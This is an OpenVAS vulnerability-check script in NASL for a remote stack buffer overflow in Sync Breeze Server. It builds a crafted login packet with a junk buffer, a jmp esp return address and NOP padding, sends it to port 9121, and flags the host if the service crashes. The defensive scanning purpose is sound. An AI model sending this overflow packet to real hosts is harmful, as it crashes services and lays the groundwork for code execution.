###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sync_breeze_server_bof_vuln.nasl 8438 2018-01-16 17:38:23Z teissa $
#
# Sync Breeze Server Remote Stack Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to crash an
affected service or execute arbitrary code with elevated privileges.

Impact Level: Application";

tag_affected = "Sync Breeze Server version 2.2.30 and prior";

tag_insight = "The flaw is caused by a buffer overflow error in the
'syncbrs.exe' service when processing overly long login requests sent to port
9121/TCP.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Sync Breeze Server and is prone to remote
stack buffer overflow vulnerability";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801529");
  script_version("$Revision: 8438 $");
  script_tag(name:"last_modification", value:"$Date: 2018-01-16 18:38:23 +0100 (Tue, 16 Jan 2018) $");
  script_tag(name:"creation_date", value:"2010-10-22 15:51:55 +0200 (Fri, 22 Oct 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Sync Breeze Server Remote Stack Buffer Overflow Vulnerability");
  script_xref(name : "URL" , value : "http://inj3ct0r.com/exploits/14421");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15231/");
  script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2010/2616");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(9120);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


## default server port
dpPort = "9121" ;
if(!get_port_state(dpPort)){
  exit(0);
}

if(!safe_checks()){
  exit(0);
}

## Open TCP Socket
soc = open_sock_tcp(dpPort);
if (!soc){
  exit(0);
}

for(i=0; i<3; i++)
{
  ## Construct crafted request of 218 bytes
  string = crap(data:"A", length:218);

  ## ASCII = "GetServerInfo.
  packet_header =("\x53\x65\x72\x76\x65\x72\x4C\x6F\x67\x69\x6E\x02");

  ## 256 byte junk buffer to reach eip
  junk = crap(data:"\x90", length:256);

  ## jmp esp (via ws2_32.dll)
  eip = "\xFB\xF8\xAB\x71";
  nops = crap(data:"\x90", length:12);

  ## packet structure
  packet = packet_header + junk + eip + nops + string + nops + nops;

  ## Send the constructed request to port 9121
  send(socket:soc, data:packet);

  sleep(10);
  ## Try to Open socket on port after exploit
  soc = open_sock_tcp(dpPort);
  if(!soc)
  {
    security_message(0);
    exit(0);
  }
}
